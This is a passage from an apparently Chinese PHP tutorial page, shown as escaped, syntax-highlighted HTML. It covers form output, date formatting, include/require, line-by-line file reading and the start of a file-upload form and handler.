punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;male&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;checked&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;male&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;男
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;* &lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$genderErr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;Submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; 
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;h2&amp;gt;您输入的内容是:&amp;lt;/h2&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$comment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;时间&#34;&gt;&lt;a href=&#34;#时间&#34; class=&#34;headerlink&#34; title=&#34;时间&#34;&gt;&lt;/a&gt;时间&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Y/m/d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Y.m.d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Y-m-d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;文件包含&#34;&gt;&lt;a href=&#34;#文件包含&#34; class=&#34;headerlink&#34; title=&#34;文件包含&#34;&gt;&lt;/a&gt;文件包含&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;//或者&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;文件操作&#34;&gt;&lt;a href=&#34;#文件操作&#34; class=&#34;headerlink&#34; title=&#34;文件操作&#34;&gt;&lt;/a&gt;文件操作&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;feof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//检测文件是否到达末尾&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//逐行读&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;feof&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//检测文件是否到达末尾&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fgetc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//逐行读&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//执行一些代码&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;文件上传&#34;&gt;&lt;a href=&#34;#文件上传&#34; class=&#34;headerlink&#34; title=&#34;文件上传&#34;&gt;&lt;/a&gt;文件上传&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;meta charset&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;utf-8&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;菜鸟教程&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;runoob&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;title&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;head&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;form action&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;upload_file.php&#34;&lt;/span&gt; method&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;post&#34;&lt;/span&gt; enctype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;multipart/form-data&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;label &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;文件名：&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;label&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;input type&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;input type&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;submit&#34;&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;submit&#34;&lt;/span&gt; value&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;提交&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;form&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;body&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;html&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
